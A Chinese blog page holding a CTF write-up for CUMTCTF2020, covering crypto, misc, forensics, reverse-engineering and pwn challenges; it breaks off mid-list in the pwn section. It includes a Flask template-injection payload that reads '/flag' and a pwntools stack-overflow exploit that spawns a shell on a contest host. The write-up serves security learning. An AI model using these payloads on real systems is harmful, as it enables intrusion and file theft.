@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>CUMTCTF2020-WP by Q1RG | Mr.Guo | 信息安全小白</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="RE">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="2020 华为杯">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMTCTF2020-WP by Q1RG">
+<meta property="og:url" content="https://github.com/gha01un/gha01un.github.io/2020/10/23/%E5%8D%8E%E4%B8%BA%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Mr.Guo">
+<meta property="og:description" content="2020 华为杯">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/uswax7XIkMP1Lft.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/10/24/vjb1sx7glfF4GSR.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/24/mzThwt2VSLcD9Uf.png">
+<meta property="og:image" content="c:/Users/大仑子/AppData/Roaming/Typora/typora-user-images/image-20201024154440955.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/z8gOXFA4GnrTSWa.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/10/22/3gmZWLoxuar97he.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/22/vaEAuyL2q3f1hXO.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/22/FxqBZ3kUvQ5XL7m.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/ZAzsLWODbBHNUPC.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/uWyHSw9MjAseXoL.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/3eZuNjbHaR8fCK6.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/LuWChrdI6PRZH57.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/ZWVjXdbYE3umvxR.png">
+<meta property="og:image" content="https://i.loli.net/2020/10/23/26zReihgx1uCDaA.png">
+<meta property="og:image" content="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-10-23-21-30-04.png">
+<meta property="article:published_time" content="2020-10-23T12:50:30.880Z">
+<meta property="article:modified_time" content="2020-11-23T13:36:36.569Z">
+<meta property="article:author" content="Mr.Guo">
+<meta property="article:tag" content="RE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/10/23/uswax7XIkMP1Lft.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Mr.Guo" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Mr.Guo</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="/243839548@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/gha01un" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/5180160661/home?wvr=5" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Twitter" href="https://twitter.com/MrGuo243839548" target="_blank"title="Twitter" >
+                <i class="icon icon-lg icon-twitter twitter"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">CUMTCTF2020-WP by Q1RG</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2020-华为杯"><span class="post-toc-number">1.</span> <span class="post-toc-text">2020 华为杯</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#密码"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">密码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Classical"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">Classical</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#ezRSA"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">ezRSA</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Misc"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">Misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Sign-In"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">Sign In</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个流量分析吧"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">出个流量分析吧</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个LSB吧"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">出个LSB吧</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个伪WEB吧"><span class="post-toc-number">1.2.4.</span> <span class="post-toc-text">出个伪WEB吧</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个文档吧"><span class="post-toc-number">1.2.5.</span> <span class="post-toc-text">出个文档吧</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个压缩包吧"><span class="post-toc-number">1.2.6.</span> <span class="post-toc-text">出个压缩包吧</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#出个内存取证吧"><span class="post-toc-number">1.2.7.</span> <span class="post-toc-text">出个内存取证吧</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#FLASK"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">FLASK</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#DOGE"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">DOGE</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RE"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">RE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#hello-world"><span class="post-toc-number">1.4.1.</span> <span class="post-toc-text">hello_world</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#fangcheng"><span class="post-toc-number">1.4.2.</span> <span class="post-toc-text">fangcheng</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#PWN"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">PWN</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#login"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">login</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#login-plus"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">login_plus</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#note-service"><span class="post-toc-number">1.5.3.</span> <span class="post-toc-text">note-service</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#messagesystem"><span class="post-toc-number">1.5.4.</span> <span class="post-toc-text">messagesystem</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#not-implemented-login-service"><span class="post-toc-number">1.5.5.</span> <span class="post-toc-text">not_implemented_login_service</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#messagesystem-plus"><span class="post-toc-number">1.5.6.</span> <span class="post-toc-text">messagesystem_plus</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#mail-service"><span class="post-toc-number">1.5.7.</span> <span class="post-toc-text">mail_service</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#safe-vpn"><span class="post-toc-number">1.5.8.</span> <span class="post-toc-text">safe_vpn</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-华为杯"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">CUMTCTF2020-WP by Q1RG</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2020-10-23 20:50:30" datetime="2020-10-23T12:50:30.880Z"  itemprop="datePublished">2020-10-23</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">16</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="2020-华为杯"><a href="#2020-华为杯" class="headerlink" title="2020 华为杯"></a>2020 华为杯</h2><a id="more"></a>                        
+
+<h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><h4 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h4><p>一个txt文件  维吉尼亚无密钥 在线工具直接拿到flag</p>
+<h4 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h4><p>给了大数n，想到winerattack，上脚本求d，然后解m</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span></span><br><span class="line">e = <span class="number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span></span><br><span class="line">d= <span class="number">8264667972294275017293339772371783322168822149471976834221082393409363691895</span></span><br><span class="line">c = <span class="number">235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151</span></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h4><p>Base64解码 Brainfuck to text</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/uswax7XIkMP1Lft.jpg" alt="](https://i.loli.net/2020/10/23/x4w8v9rHElj3Yam.jpg)![" title="">
+                </div>
+                <div class="image-caption">](https://i.loli.net/2020/10/23/x4w8v9rHElj3Yam.jpg)![</div>
+            </figure>
+
+
+
+<h4 id="出个流量分析吧"><a href="#出个流量分析吧" class="headerlink" title="出个流量分析吧"></a>出个流量分析吧</h4><p>放入WIRESHARK .搜FLAG</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/24/vjb1sx7glfF4GSR.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h4 id="出个LSB吧"><a href="#出个LSB吧" class="headerlink" title="出个LSB吧"></a>出个LSB吧</h4><p>STEGSOLVE 重新保存得到二维码扫码即可。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/24/mzThwt2VSLcD9Uf.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h4 id="出个伪WEB吧"><a href="#出个伪WEB吧" class="headerlink" title="出个伪WEB吧"></a>出个伪WEB吧</h4><p>通过时间找到2020年的作为线索，然后直接找到类似字符串。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="C:\Users\大仑子\AppData\Roaming\Typora\typora-user-images\image-20201024154440955.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/z8gOXFA4GnrTSWa.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+
+<h4 id="出个文档吧"><a href="#出个文档吧" class="headerlink" title="出个文档吧"></a>出个文档吧</h4><p>word隐写，在选项里找隐藏文字</p>
+<h4 id="出个压缩包吧"><a href="#出个压缩包吧" class="headerlink" title="出个压缩包吧"></a>出个压缩包吧</h4><p>在winhex中修改，7A改成74 ，在stegsolve中发现两个一半的二维码，用ps拼到一起就行了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/22/3gmZWLoxuar97he.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/22/vaEAuyL2q3f1hXO.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/22/FxqBZ3kUvQ5XL7m.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h4 id="出个内存取证吧"><a href="#出个内存取证吧" class="headerlink" title="出个内存取证吧"></a>出个内存取证吧</h4><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">volatility imageinfo -f 1.img</span><br></pre></td></tr></table></figure></div>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/ZAzsLWODbBHNUPC.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">volatility filescan -f 1.img --profile&#x3D;Win2003SP1x86 | grep flag  查看一下文件并匹配一下flag  发现flag.png,dump出来</span><br></pre></td></tr></table></figure></div>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/uWyHSw9MjAseXoL.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>扫码得到：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</p>
+<p>系统里的窗口列表：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">volatility -f 1.img --profile&#x3D;Win2003SP1x86 windows</span><br></pre></td></tr></table></figure></div>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/3eZuNjbHaR8fCK6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>看到 flag.png 是由 explorer.exe 进程里的 Windows 图片查看器打开的。<br>查看内存并把explorer.exe dump：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">volatility -f 1.img --profile&#x3D;Win2003SP1x86 pslist</span><br></pre></td></tr></table></figure></div>
+
+<p>explorer.exe 这个进程的内存试试，pid 为 1992。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">volatility -f 1.img --profile&#x3D;Win2003SP1x86 memdump -p 1992 -D .&#x2F;</span><br></pre></td></tr></table></figure></div>
+
+<p>对dump出的文件使用binwalk<br>分离出来png 还有 key 和 iv</p>
+<p>aes 加密</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">密文：jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4=</span><br><span class="line">key: Th1s_1s_K3y00000</span><br><span class="line">iv: <span class="number">1234567890123456</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="FLASK"><a href="#FLASK" class="headerlink" title="FLASK"></a>FLASK</h4><p>模板注入</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">‘’[http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;%7B%7B().__class__.__bases__.__getitem__(0)%7D%7D](http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0)&#125;&#125;)</span><br><span class="line"></span><br><span class="line">[http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;%7B%7B](http:&#x2F;&#x2F;202.119.201.199:9001&#x2F;name&#x3D;&#123;&#123;)&#39;&#39;‘’.class.mro.getitem(2).subclasses().pop(40)(&#39;&#x2F;flag&#39;).read()%7D%7D</span><br></pre></td></tr></table></figure></div>
+
+<p>本地按照常规思路想要LS一下，但是发现IMPORT,FNC,OS等都被办了，绕过实在绕不过去，看到最下边学长写到看看HOME，直接盲猜/flag，得到最终flag。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/LuWChrdI6PRZH57.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/10/23/ZWVjXdbYE3umvxR.png" alt="image-20201023205000472" title="">
+                </div>
+                <div class="image-caption">image-20201023205000472</div>
+            </figure>
+
+<h4 id="DOGE"><a href="#DOGE" class="headerlink" title="DOGE"></a>DOGE</h4><p>F12有一大串代码，放入控制台，得到BASE64,然后解码（貌似直接抽也可以，看运气）。</p>
+<p> <img src="https://i.loli.net/2020/10/23/26zReihgx1uCDaA.png" alt=""></p>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h4><p>关键点在如下的语句上  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_BYTE)a2 != ((<span class="keyword">unsigned</span> __int8)a1 ^ (<span class="keyword">unsigned</span> __int8)aIsEasyRight[i % <span class="built_in">strlen</span>(a1)]) )</span><br><span class="line">&#123;</span><br><span class="line">  sub_401530();</span><br><span class="line">  <span class="built_in">printf</span>(a1, a2, v4, <span class="string">"wrong!!!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>根据判断条件逆向求解flag即可  </p>
+<p><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x2a</span>,<span class="number">0x26</span>,<span class="number">0x12</span>,<span class="number">0x31</span>,<span class="number">0x1a</span>,<span class="number">0x7</span>,<span class="number">0x11</span>,<span class="number">0x3a</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0x0e</span>,<span class="number">0x1a</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x36</span>,<span class="number">0x43</span>,<span class="number">0x31</span>,<span class="number">0x0</span>,<span class="number">0x3e</span>,<span class="number">0x16</span>,<span class="number">0x17</span>,<span class="number">0x35</span>,<span class="number">0x1d</span>,<span class="number">0x10</span>,<span class="number">0x38</span>,<span class="number">0x11</span>,<span class="number">0x44</span>,<span class="number">0x4a</span>,<span class="number">0x1b</span>,<span class="number">0x2c</span>,<span class="number">0x2b</span>,<span class="number">0x17</span>,<span class="number">0x50</span>,<span class="number">0x3</span>,<span class="number">0x4</span>]</span><br><span class="line">b = <span class="string">'is_easy_right?'</span></span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">35</span>):</span><br><span class="line">	s+=chr(a[i]^ord(b[i%<span class="number">14</span>]))</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="fangcheng"><a href="#fangcheng" class="headerlink" title="fangcheng"></a>fangcheng</h4><p>这个题基本逻辑就是一个解方程的题目  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    dword_407044 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">3</span>; ++j )</span><br><span class="line">      dword_407044 += byte_403010[<span class="number">4</span> * i + j] * byte_40703E[j];</span><br><span class="line">    <span class="keyword">if</span> ( dword_403020[i] != dword_407044 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>在线解方程，求得4个解为</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">116,103,102,114</span><br></pre></td></tr></table></figure></div>
+
+<p>flag即为四个解的十六进制再加上flag{}</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>利用栈溢出修改返回地址，控制程序流，获取shell<br><strong>EXP:</strong></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10000'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'gth less than 20):\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x20</span>+<span class="string">'a'</span>*<span class="number">0x8</span>+p64(<span class="number">0x4009F7</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'password(length less than 20):\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="login-plus"><a href="#login-plus" class="headerlink" title="login_plus"></a>login_plus</h4><p>整数溢出漏洞，输入<code>0x100000000</code>，即<code>4294967296</code>就可以获取shell  </p>
+<h4 id="note-service"><a href="#note-service" class="headerlink" title="note-service"></a>note-service</h4><p>拖入IDA中查看反汇编代码<br><img src="https://xsblog-1302078449.cos.ap-shanghai.myqcloud.com/blog/2020-10-23-21-30-04.png" alt=""><br>可以看到非常明显的格式化字符串漏洞，再查看一下保护机制</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">[*] &#39;&#x2F;root&#x2F;ctf&#x2F;note_service&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure></div>
+
+<p>保护全开，在这种条件下有两种方法</p>
+<ul>
+<li>第一种是泄露栈地址，通过格式化字符串漏洞修改返回地址控制程序流，从而拿到shell</li>
+<li>第二种是通过修改__free_hook为one_gadget以获取shell  </li>
